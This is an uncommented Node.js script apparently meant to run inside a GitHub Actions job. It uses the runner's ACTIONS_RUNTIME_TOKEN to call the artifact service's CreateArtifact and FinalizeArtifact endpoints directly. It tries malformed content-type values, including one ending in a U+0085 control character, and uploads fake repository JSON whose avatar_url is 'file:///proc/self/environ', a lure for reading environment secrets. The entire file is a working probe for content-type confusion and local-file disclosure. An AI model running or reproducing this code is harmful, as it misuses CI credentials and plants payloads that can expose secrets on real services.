const crypto=require('node:crypto'),https=require('node:https'),http=require('node:http');
const varint=n=>{n=BigInt(n);const o=[];while(n>0x7fn){o.push(Number(n&0x7fn)|0x80);n>>=7n;}o.push(Number(n));return Buffer.from(o)};
const fs=(n,v)=>Buffer.concat([varint(n<<3|2),varint(v.length),v]);
const fv=(n,v)=>Buffer.concat([varint(n<<3),varint(v)]);
const wrap=v=>fs(1,v);
const fields=d=>{const out=[];let i=0;const rv=()=>{let v=0n,s=0n;for(;;){const b=d[i++];v|=BigInt(b&0x7f)<<s;if(!(b&0x80))return v;s+=7n;}};while(i<d.length){const k=rv();const n=Number(k>>3n),w=Number(k&7n);let v;if(w===0)v=rv();else if(w===2){const l=Number(rv());v=d.subarray(i,i+l);i+=l;}else throw new Error('w'+w);out.push([n,w,v]);}return out;};
const payload=Buffer.from(JSON.stringify({full_name:'x',owner:{login:'u',avatar_url:'file:///proc/self/environ'},description:'',stargazers_count:0}));
const odd='application/json\u0085';
const putRaw=(u,d,h)=>new Promise((res,rej)=>{const U=new URL(u),m=U.protocol==='https:'?https:http;const r=m.request(U,{method:'PUT',headers:h},x=>{let b='';x.on('data',c=>b+=c);x.on('end',()=>res({status:x.statusCode,body:b}));});r.on('error',rej);r.end(d);});
const post=(u,b)=>fetch(u,{method:'POST',headers:{authorization:'Bearer '+process.env.ACTIONS_RUNTIME_TOKEN,'content-type':'application/protobuf'},body:b});
(async()=>{
 const t=process.env.ACTIONS_RUNTIME_TOKEN,base=process.env.ACTIONS_RESULTS_URL.replace(/\/$/,'');
 const c=JSON.parse(Buffer.from(t.split('.')[1],'base64url'));
 const sc=c.scp.split(' ').find(x=>x.startsWith('Actions.Results:'));const [,run,job]=sc.split(':');
 const svc='github.actions.results.api.v1.ArtifactService';
 const cases=[['empty',7,'',false],['omit',7,undefined,true],['space',7,'application/json ',false],['semi',7,'application/json;',false],['param',7,'application/json; x=',false]];
 for(const [label,ver,mime,omit] of cases){
  const name=`h-${label}-${Date.now()}.dat`;
  try{
   const parts=[fs(1,Buffer.from(run)),fs(2,Buffer.from(job)),fs(3,Buffer.from(name)),fv(5,ver)];
   if(!omit)parts.push(fs(6,wrap(Buffer.from(mime))));
   const r=await post(`${base}/twirp/${svc}/CreateArtifact`,Buffer.concat(parts));
   const rb=Buffer.from(await r.arrayBuffer());
   if(!r.ok){console.log('RESULT',label,'create',r.status,rb.toString().slice(0,90));continue;}
   const signed=fields(rb).find(([n,w])=>n===2&&w===2)[2].toString();
   const up=await putRaw(signed,payload,{'x-ms-blob-type':'BlockBlob','x-ms-blob-content-type':odd,'Content-Length':String(payload.length)});
   const dig='sha256:'+crypto.createHash('sha256').update(payload).digest('hex');
   const fin=Buffer.concat([fs(1,Buffer.from(run)),fs(2,Buffer.from(job)),fs(3,Buffer.from(name)),fv(4,payload.length),fs(5,wrap(Buffer.from(dig)))]);
   const f=await post(`${base}/twirp/${svc}/FinalizeArtifact`,fin);
   const fb=Buffer.from(await f.arrayBuffer());
   if(!f.ok){console.log('RESULT',label,'finalize',f.status,fb.toString().slice(0,90));continue;}
   console.log('RESULT',label,'id',fields(fb).find(([n,w])=>n===2&&w===0)[2].toString(),'up',up.status);
  }catch(e){console.log('RESULT',label,'ERR',String(e).slice(0,100));}
 }
})();
